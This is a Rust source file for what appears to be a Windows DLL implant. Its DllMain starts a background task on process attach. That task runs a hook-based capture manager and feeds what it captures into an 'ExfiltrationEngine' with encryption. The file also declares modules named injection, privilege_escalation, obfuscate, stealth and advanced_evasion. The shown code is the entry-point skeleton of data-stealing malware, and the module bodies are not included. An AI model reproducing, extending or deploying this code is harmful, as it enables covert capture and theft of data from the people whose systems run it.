// Windows DLL Entry Point
#[cfg(windows)]
#[no_mangle]
pub extern "system" fn DllMain(
    _hinst_dll: winapi::um::winnt::HINSTANCE,
    fdw_reason: u32,
    _lpv_reserved: winapi::um::winnt::LPVOID,
) -> winapi::um::winnt::BOOL {
    use winapi::um::winbase::{DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH};
    
    match fdw_reason {
        DLL_PROCESS_ATTACH => {
            // Initialize on DLL load
            std::thread::spawn(|| {
                let rt = tokio::runtime::Runtime::new().unwrap();
                rt.block_on(init_seed());
            });
            winapi::um::winnt::TRUE
        }
        DLL_PROCESS_DETACH => {
            // Cleanup on DLL unload
            winapi::um::winnt::TRUE
        }
        _ => winapi::um::winnt::TRUE,
    }
}

async fn init_seed() {
    use std::sync::Arc;
    use tokio::sync::mpsc;
    
    let hook_manager = Arc::new(hook::HookManager::new());
    let crypto_manager = Arc::new(crypto::CryptoManager::new());
    
    let (data_tx, data_rx) = mpsc::unbounded_channel();
    
    let hook_mgr = hook_manager.clone();
    tokio::spawn(async move {
        hook_mgr.start_capture(data_tx).await;
    });
    
    let exfil_engine = exfil::ExfiltrationEngine::new(crypto_manager, data_rx);
    exfil_engine.start().await;
}

mod hook;
mod hook_inline;
mod exfil;
mod crypto;
mod buffer;
mod obfuscate;
mod injection;
mod privilege_escalation;
mod tor_detection;
mod stealth;
mod advanced_evasion;
mod proto;

pub use hook::HookManager;
pub use exfil::ExfiltrationEngine;
pub use crypto::CryptoManager;

